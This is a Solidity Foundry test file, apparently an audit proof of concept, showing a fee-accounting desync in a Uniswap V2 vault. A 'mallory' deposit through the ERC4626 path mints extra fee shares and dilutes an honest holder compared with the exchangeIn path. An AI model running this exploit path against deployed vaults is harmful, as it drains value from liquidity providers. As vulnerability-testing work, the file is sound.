// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IUniswapV2Pair} from "@crane/contracts/interfaces/protocols/dexes/uniswap/v2/IUniswapV2Pair.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IStandardExchangeIn} from "contracts/interfaces/IStandardExchangeIn.sol";
import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
import {TestBase_UniswapV2StandardExchange} from
    "contracts/protocols/dexes/uniswap/v2/test/bases/TestBase_UniswapV2StandardExchange.sol";

contract UniV2CraneFeeDesync_Test is TestBase_UniswapV2StandardExchange {
    ERC20PermitMintableStub tA;
    ERC20PermitMintableStub tB;
    address alice = makeAddr("alice");
    address carol = makeAddr("carol");
    address mallory = makeAddr("mallory");
    address vault;
    IUniswapV2Pair pair;

    function setUp() public override {
        super.setUp();
        tA = new ERC20PermitMintableStub("A", "A", 18, address(this), 1e30);
        tB = new ERC20PermitMintableStub("B", "B", 18, address(this), 1e30);
        tA.transfer(alice, 100 ether); tB.transfer(alice, 100 ether);
        vm.startPrank(alice);
        tA.approve(address(uniswapV2StandardExchangeDFPkg), type(uint256).max);
        tB.approve(address(uniswapV2StandardExchangeDFPkg), type(uint256).max);
        vault = uniswapV2StandardExchangeDFPkg.deployVault(IERC20(address(tA)), 100 ether, IERC20(address(tB)), 100 ether, alice);
        vm.stopPrank();
        pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(tA), address(tB)));
        // Other LPs: vault owns ~10% of pool
        _addLp(carol, 900 ether);
        _addLp(mallory, 10 ether);
    }

    function _addLp(address who, uint256 amt) internal {
        tA.transfer(address(pair), amt); tB.transfer(address(pair), amt);
        pair.mint(who);
    }

    function _aliceLpValue() internal view returns (uint256) {
        return IERC20(vault).balanceOf(alice) * IERC4626(vault).totalAssets() / IERC20(vault).totalSupply();
    }

    function _trigger() internal {
        // honest tiny SE op by carol after buying a few shares? use alice redeeming 1e6 shares to LP
        vm.prank(alice);IStandardExchangeIn(vault).exchangeIn(IERC20(vault), 1e6, IERC20(address(pair)), 0, alice, false, block.timestamp + 1);
    }

    function _run(bool viaCrane) internal returns (uint256 feeShares, uint256 aliceLp) {
        address feeTo = address(IVaultFeeOracleQuery(address(indexedexManager)).feeTo());
        uint256 D = pair.balanceOf(mallory);
        vm.startPrank(mallory);
        pair.approve(vault, D);
        if (viaCrane) IERC4626(vault).deposit(D, mallory);else IStandardExchangeIn(vault).exchangeIn(IERC20(address(pair)), D, IERC20(vault), 0, mallory, false, block.timestamp + 1);
        vm.stopPrank();
        uint256 f0 = IERC20(vault).balanceOf(feeTo);
        _trigger();
        feeShares = IERC20(vault).balanceOf(feeTo) - f0;
        aliceLp = _aliceLpValue();
    }

    function test_feeDesync() public {
        console2.log("usageFee", IVaultFeeOracleQuery(address(indexedexManager)).usageFeeOfVault(vault));
        console2.log("vault LP owned", IERC4626(vault).totalAssets(), "pool supply", pair.totalSupply());
        uint256 aliceBefore = _aliceLpValue();
        console2.log("alice LP value before", aliceBefore);
        uint256 snap = vm.snapshotState();
        (uint256 fCtl, uint256 aCtl) = _run(false);
        console2.log("CONTROL (SE deposit) feeShares", fCtl, "alice LP value", aCtl);
        vm.revertToState(snap);
        (uint256 fAtk, uint256 aAtk) = _run(true);
        console2.log("CRANE deposit feeShares", fAtk, "alice LP value", aAtk);
        console2.log("vault supply after", IERC20(vault).totalSupply());
        assertGt(fAtk, fCtl, "crane path mints excess fee shares");
        assertLt(aAtk, aCtl, "alice diluted");
        console2.log("alice LP loss vs control", aCtl - aAtk);
    }
}
